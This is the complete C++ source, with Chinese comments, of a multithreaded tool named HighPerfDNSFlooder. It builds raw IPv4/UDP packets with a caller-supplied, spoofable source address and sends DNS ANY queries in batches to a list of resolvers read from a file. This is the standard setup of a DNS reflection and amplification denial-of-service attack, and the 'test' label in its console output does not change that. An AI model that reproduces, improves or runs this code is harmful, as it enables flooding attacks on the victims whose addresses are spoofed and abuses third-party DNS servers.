#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <thread>
#include <atomic>
#include <cstring>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <chrono>
#include <signal.h>
#include <fcntl.h>
#include <iomanip>
#include <array>

// 预分配的常量
constexpr size_t MAX_PACKET_SIZE = 1500;
constexpr size_t CACHE_LINE_SIZE = 64;

// DNS头部结构 - 紧凑布局
struct dns_header {
    uint16_t id;
    uint16_t flags;
    uint16_t qdcount;
    uint16_t ancount;
    uint16_t nscount;
    uint16_t arcount;
} __attribute__((packed));

// DNS查询问题部分
struct dns_question {
    uint16_t qtype;
    uint16_t qclass;
} __attribute__((packed));

// 线程本地统计，避免false sharing
struct alignas(CACHE_LINE_SIZE) ThreadStats {
    std::atomic<uint64_t> packets_sent{0};
    std::atomic<uint64_t> packets_failed{0};
    char padding[CACHE_LINE_SIZE - 2 * sizeof(std::atomic<uint64_t>)];
};

// 预编码的域名结构
struct PreEncodedDomain {
    std::vector<uint8_t> data;
    size_t length;
};

class HighPerfDNSFlooder {
private:
    int raw_sock;
    std::string source_ip;
    uint32_t source_ip_int; // 预转换的源IP
    
    std::vector<std::string> dns_servers;
    std::vector<uint32_t> dns_servers_int; // 预转换的DNS服务器IP
    
    std::vector<PreEncodedDomain> encoded_domains; // 预编码的域名
    
    std::vector<ThreadStats> thread_stats;
    std::atomic<bool> running;
    
    // 基础包模板（固定部分）
    struct BaseTemplate {
        std::array<uint8_t, sizeof(struct iphdr) + sizeof(struct udphdr) + 
                           sizeof(struct dns_header) + sizeof(struct dns_question)> buffer;
        size_t domain_offset; // 域名插入位置
    };
    BaseTemplate base_template;
    
    // 优化的校验和计算
    uint16_t checksum(const uint16_t* buf, size_t len) {
        uint32_t sum = 0;
        const uint32_t* buf32 = reinterpret_cast<const uint32_t*>(buf);
        
        // 32位累加
        while (len >= 4) {
            sum += *buf32++;
            len -= 4;
        }
        
        // 处理剩余部分
        if (len >= 2) {
            sum += *reinterpret_cast<const uint16_t*>(buf32);
        }
        
        // 折叠进位
        sum = (sum >> 16) + (sum & 0xFFFF);
        sum += (sum >> 16);
        return static_cast<uint16_t>(~sum);
    }
    
    // 预编码域名
    void pre_encode_domains(const std::vector<std::string>& domains) {
        encoded_domains.reserve(domains.size());
        
        for (const auto& domain : domains) {
            PreEncodedDomain encoded;
            
            size_t start = 0;
            size_t end = domain.find('.');
            while (end != std::string::npos) {
                std::string segment = domain.substr(start, end - start);
                encoded.data.push_back(static_cast<uint8_t>(segment.length()));
                encoded.data.insert(encoded.data.end(), segment.begin(), segment.end());
                start = end + 1;
                end = domain.find('.', start);
            }
            std::string last_segment = domain.substr(start);
            encoded.data.push_back(static_cast<uint8_t>(last_segment.length()));
            encoded.data.insert(encoded.data.end(), last_segment.begin(), last_segment.end());
            encoded.data.push_back(0);
            
            encoded.length = encoded.data.size();
            encoded_domains.push_back(std::move(encoded));
        }
    }
    
    // 构建基础模板（只做一次）
    void build_base_template() {
        // IP头部固定部分
        struct iphdr* ip_header = reinterpret_cast<struct iphdr*>(base_template.buffer.data());
        ip_header->ihl = 5;
        ip_header->version = 4;
        ip_header->tos = 0;
        ip_header->frag_off = 0;
        ip_header->ttl = 64;
        ip_header->protocol = IPPROTO_UDP;
        ip_header->check = 0;
        ip_header->saddr = source_ip_int;
        
        // UDP头部固定部分
        struct udphdr* udp_header = reinterpret_cast<struct udphdr*>(ip_header + 1);
        udp_header->dest = htons(53);
        udp_header->check = 0;
        
        // DNS头部固定部分
        struct dns_header* dns_hdr = reinterpret_cast<struct dns_header*>(udp_header + 1);
        dns_hdr->flags = htons(0x0100);
        dns_hdr->qdcount = htons(1);
        dns_hdr->ancount = 0;
        dns_hdr->nscount = 0;
        dns_hdr->arcount = 0;
        
        // DNS问题部分固定部分
        struct dns_question* question = reinterpret_cast<struct dns_question*>(
            dns_hdr + 1);
        question->qtype = htons(255);  // ANY类型
        question->qclass = htons(1);
        
        // 记录域名插入偏移
        base_template.domain_offset = sizeof(struct iphdr) + sizeof(struct udphdr) + 
                                    sizeof(struct dns_header);
    }
    
    // 快速构建完整包（实时计算长度）
    void build_complete_packet(uint8_t* packet, uint32_t dns_server_ip, 
                              uint16_t src_port, uint16_t packet_id,
                              const PreEncodedDomain& domain) {
        // 1. 复制基础模板
        memcpy(packet, base_template.buffer.data(), base_template.buffer.size());
        
        // 2. 插入域名
        memcpy(packet + base_template.domain_offset, 
               domain.data.data(), domain.length);
        
        // 3. 更新可变字段
        struct iphdr* ip_header = reinterpret_cast<struct iphdr*>(packet);
        struct udphdr* udp_header = reinterpret_cast<struct udphdr*>(ip_header + 1);
        struct dns_header* dns_hdr = reinterpret_cast<struct dns_header*>(udp_header + 1);
        
        // 计算总长度
        uint16_t total_len = static_cast<uint16_t>(
            sizeof(struct iphdr) + sizeof(struct udphdr) + 
            sizeof(struct dns_header) + domain.length + sizeof(struct dns_question));
        
        // 设置IP头部
        ip_header->daddr = dns_server_ip;
        ip_header->id = htons(packet_id);
        ip_header->tot_len = htons(total_len);
        
        // 设置UDP头部
        udp_header->source = htons(src_port);
        udp_header->len = htons(static_cast<uint16_t>(
            sizeof(struct udphdr) + sizeof(struct dns_header) + 
            domain.length + sizeof(struct dns_question)));
        
        // 设置DNS头部
        dns_hdr->id = htons(packet_id);
        
        // 计算IP校验和
        ip_header->check = 0;
        ip_header->check = checksum(reinterpret_cast<uint16_t*>(packet), sizeof(struct iphdr));
    }
    
    void send_thread(int thread_id, int total_threads) {
        ThreadStats& stats = thread_stats[thread_id];
        
        // 预分配包缓冲区（批处理使用）
        constexpr size_t BATCH_SIZE = 64;
        std::array<std::array<uint8_t, MAX_PACKET_SIZE>, BATCH_SIZE> batch_packets;
        std::array<struct sockaddr_in, BATCH_SIZE> batch_dest_addrs;
        
        // 初始化目标地址结构
        for (auto& addr : batch_dest_addrs) {
            memset(&addr, 0, sizeof(addr));
            addr.sin_family = AF_INET;
        }
        
        // 使用模运算实现伪随机分布
        uint64_t sequence = thread_id;
        
        // 预计算模数常量
        const size_t server_mod = dns_servers_int.size();
        const size_t domain_mod = encoded_domains.size();
        
        // 每个线程从不同位置开始
        size_t server_base = thread_id % server_mod;
        size_t domain_base = thread_id % domain_mod;
        
        while (running) {
            // 批量构建包
            for (size_t i = 0; i < BATCH_SIZE && running; ++i) {
                // 使用模运算选择服务器和域名
                size_t server_idx = (server_base + sequence) % server_mod;
                size_t domain_idx = (domain_base + sequence) % domain_mod;
                
                const auto& domain = encoded_domains[domain_idx];
                
                // 生成端口和ID - 使用模运算
                uint16_t src_port = static_cast<uint16_t>(
                    10000 + (thread_id * 1000) + (sequence % 1000));
                uint16_t packet_id = static_cast<uint16_t>(sequence & 0xFFFF);
                
                // 构建完整包
                build_complete_packet(batch_packets[i].data(),
                                    dns_servers_int[server_idx],
                                    src_port, packet_id, domain);
                
                // 设置目标地址
                batch_dest_addrs[i].sin_addr.s_addr = dns_servers_int[server_idx];
                
                sequence++;
            }
            
            // 批量发送
            for (size_t i = 0; i < BATCH_SIZE && running; ++i) {
                const auto& domain = encoded_domains[(domain_base + sequence - BATCH_SIZE + i) % domain_mod];
                
                ssize_t sent = sendto(raw_sock, batch_packets[i].data(), 
                                    sizeof(struct iphdr) + sizeof(struct udphdr) + 
                                    sizeof(struct dns_header) + domain.length + 
                                    sizeof(struct dns_question),
                                    0,
                                    reinterpret_cast<struct sockaddr*>(&batch_dest_addrs[i]), 
                                    sizeof(struct sockaddr_in));
                
                // 更新统计
                if (sent > 0) {
                    stats.packets_sent.fetch_add(1, std::memory_order_relaxed);
                } else {
                    stats.packets_failed.fetch_add(1, std::memory_order_relaxed);
                }
            }
            
            // 每批处理后检查是否需要让步
            if ((sequence / BATCH_SIZE) % 1000 == 0) {
                std::this_thread::yield();
            }
        }
    }

public:
    HighPerfDNSFlooder(const std::string& src_ip) 
        : source_ip(src_ip), running(false) {
        
        // 预转换源IP
        if (inet_pton(AF_INET, src_ip.c_str(), &source_ip_int) != 1) {
            throw std::runtime_error("Invalid source IP address");
        }
        source_ip_int = ntohl(source_ip_int);
        
        // 创建原始套接字
        raw_sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
        if (raw_sock < 0) {
            perror("socket");
            throw std::runtime_error("Failed to create raw socket (need root privileges)");
        }
        
        // 设置套接字选项
        int one = 1;
        if (setsockopt(raw_sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
            perror("setsockopt");
            close(raw_sock);
            throw std::runtime_error("Failed to set IP_HDRINCL");
        }
        
        // 提高发送缓冲区大小
        int send_buf_size = 1024 * 1024 * 4; // 4MB
        if (setsockopt(raw_sock, SOL_SOCKET, SO_SNDBUF, &send_buf_size, sizeof(send_buf_size)) < 0) {
            perror("setsockopt SO_SNDBUF");
        }
    }
    
    ~HighPerfDNSFlooder() {
        stop();
        if (raw_sock >= 0) {
            close(raw_sock);
        }
    }
    
    bool load_dns_servers(const std::string& filename) {
        std::ifstream file(filename);
        if (!file.is_open()) {
            std::cerr << "Failed to open DNS servers file: " << filename << std::endl;
            return false;
        }
        
        std::string line;
        size_t count = 0;
        
        // 预分配合理空间（可根据文件大小优化）
        dns_servers.reserve(1000);
        dns_servers_int.reserve(1000);
        
        while (std::getline(file, line)) {
            if (!line.empty()) {
                // 移除可能的空白字符
                line.erase(0, line.find_first_not_of(" \t"));
                line.erase(line.find_last_not_of(" \t") + 1);
                
                if (!line.empty()) {
                    dns_servers.push_back(line);
                    uint32_t ip_int;
                    if (inet_pton(AF_INET, line.c_str(), &ip_int) != 1) {
                        std::cerr << "Warning: Invalid IP address: " << line << std::endl;
                        dns_servers.pop_back();
                        continue;
                    }
                    dns_servers_int.push_back(ip_int);
                    count++;
                }
            }
        }
        
        std::cout << "Loaded " << count << " DNS servers from " << filename << std::endl;
        
        if (count > 10000) {
            std::cout << "Info: Large number of DNS servers (" << count 
                      << "), consider grouping for better performance." << std::endl;
        }
        
        return count > 0;
    }
    
    bool load_domains(const std::string& filename) {
        std::ifstream file(filename);
        if (!file.is_open()) {
            std::cerr << "Failed to open domains file: " << filename << std::endl;
            return false;
        }
        
        std::vector<std::string> domains;
        std::string line;
        size_t count = 0;
        
        // 预分配空间
        domains.reserve(10000);
        
        while (std::getline(file, line)) {
            if (!line.empty()) {
                // 移除可能的空白字符
                line.erase(0, line.find_first_not_of(" \t"));
                line.erase(line.find_last_not_of(" \t") + 1);
                
                if (!line.empty()) {
                    domains.push_back(line);
                    count++;
                }
            }
        }
        
        // 预编码域名
        pre_encode_domains(domains);
        
        std::cout << "Loaded and encoded " << encoded_domains.size() 
                  << " domains from " << filename << std::endl;
        
        if (encoded_domains.size() > 50000) {
            std::cout << "Info: Large number of domains (" << encoded_domains.size() 
                      << "), performance may be affected." << std::endl;
        }
        
        return !encoded_domains.empty();
    }
    
    void start(int thread_count = -1) {
        if (dns_servers.empty()) {
            std::cerr << "No DNS servers loaded!" << std::endl;
            return;
        }
        if (encoded_domains.empty()) {
            std::cerr << "No domains loaded!" << std::endl;
            return;
        }
        
        if (thread_count <= 0) {
            thread_count = std::thread::hardware_concurrency();
            if (thread_count == 0) thread_count = 4;
        }
        
        // 构建基础模板
        build_base_template();
        
        // 初始化线程统计
        thread_stats.resize(thread_count);
        running = true;
        
        std::vector<std::thread> threads;
        threads.reserve(thread_count);
        
        std::cout << "==========================================" << std::endl;
        std::cout << "Starting High-Performance DNS Flood Test" << std::endl;
        std::cout << "Source IP: " << source_ip << std::endl;
        std::cout << "DNS Servers: " << dns_servers.size() << std::endl;
        std::cout << "Domains: " << encoded_domains.size() << std::endl;
        std::cout << "Threads: " << thread_count << std::endl;
        std::cout << "Batch Size: 64 packets" << std::endl;
        std::cout << "==========================================" << std::endl;
        
        // 启动发送线程
        for (int i = 0; i < thread_count; ++i) {
            threads.emplace_back(&HighPerfDNSFlooder::send_thread, this, i, thread_count);
        }
        
        // 统计线程
        std::thread stats_thread([this, thread_count]() {
            auto last_time = std::chrono::steady_clock::now();
            uint64_t last_total = 0;
            
            while (running) {
                std::this_thread::sleep_for(std::chrono::seconds(2));
                
                auto now = std::chrono::steady_clock::now();
                auto elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(now - last_time).count();
                
                // 聚合所有线程的统计
                uint64_t total_sent = 0;
                uint64_t total_failed = 0;
                for (auto& stat : thread_stats) {
                    total_sent += stat.packets_sent.load(std::memory_order_relaxed);
                    total_failed += stat.packets_failed.load(std::memory_order_relaxed);
                }
                
                double elapsed_seconds = elapsed / 1000.0;
                uint64_t pps = static_cast<uint64_t>(
                    (total_sent - last_total) / (elapsed_seconds > 0 ? elapsed_seconds : 1));
                
                std::cout << "[" << std::fixed << std::setprecision(1) 
                         << (elapsed_seconds > 0 ? 1.0/elapsed_seconds * (total_sent - last_total) : 0)
                         << " Kpps] "
                         << "Total: " << total_sent 
                         << " | PPS: " << pps 
                         << " | Failed: " << total_failed 
                         << " | Threads: " << thread_count << std::endl;
                
                last_time = now;
                last_total = total_sent;
            }
        });
        
        std::cout << "Test started. Press Enter to stop..." << std::endl;
        std::cin.get();
        
        stop();
        
        for (auto& thread : threads) {
            if (thread.joinable()) {
                thread.join();
            }
        }
        
        if (stats_thread.joinable()) {
            stats_thread.join();
        }
        
        // 最终统计
        uint64_t total_sent = 0;
        uint64_t total_failed = 0;
        for (auto& stat : thread_stats) {
            total_sent += stat.packets_sent.load();
            total_failed += stat.packets_failed.load();
        }
        
        std::cout << "\nTest stopped." << std::endl;
        std::cout << "Total packets sent: " << total_sent << std::endl;
        std::cout << "Total packets failed: " << total_failed << std::endl;
        std::cout << "Success rate: " 
                  << (total_sent > 0 ? (100.0 * total_sent / (total_sent + total_failed)) : 0)
                  << "%" << std::endl;
    }
    
    void stop() {
        running = false;
    }
};

// 全局变量用于信号处理
HighPerfDNSFlooder* g_flooder = nullptr;

void signal_handler(int signal) {
    std::cout << "\nReceived signal " << signal << ", stopping..." << std::endl;
    if (g_flooder) {
        g_flooder->stop();
    }
}

void print_usage(const char* program_name) {
    std::cout << "Usage: " << program_name << " <source_ip> <domains_file> <dns_servers_file> [thread_count]" << std::endl;
    std::cout << "Arguments:" << std::endl;
    std::cout << "  source_ip          Source IP address to use in packets" << std::endl;
    std::cout << "  domains_file       File containing list of domains (one per line)" << std::endl;
    std::cout << "  dns_servers_file   File containing list of DNS servers (one per line)" << std::endl;
    std::cout << "  thread_count       Number of threads to use (optional, default: CPU cores)" << std::endl;
}

int main(int argc, char* argv[]) {
    if (argc < 4 || argc > 5) {
        print_usage(argv[0]);
        return 1;
    }
    
    std::string source_ip = argv[1];
    std::string domains_file = argv[2];
    std::string dns_servers_file = argv[3];
    int thread_count = -1;
    
    if (argc == 5) {
        thread_count = std::stoi(argv[4]);
        if (thread_count <= 0) {
            std::cerr << "Error: Thread count must be positive" << std::endl;
            return 1;
        }
    }
    
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
    
    try {
        HighPerfDNSFlooder flooder(source_ip);
        g_flooder = &flooder;
        
        if (!flooder.load_domains(domains_file)) {
            std::cerr << "Failed to load domains from " << domains_file << std::endl;
            return 1;
        }
        
        if (!flooder.load_dns_servers(dns_servers_file)) {
            std::cerr << "Failed to load DNS servers from " << dns_servers_file << std::endl;
            return 1;
        }
        
        flooder.start(thread_count);
        
    } catch (const std::exception& e) {
        std::cerr << "Error: " << e.what() << std::endl;
        return 1;
    }
    
    g_flooder = nullptr;
    return 0;
}
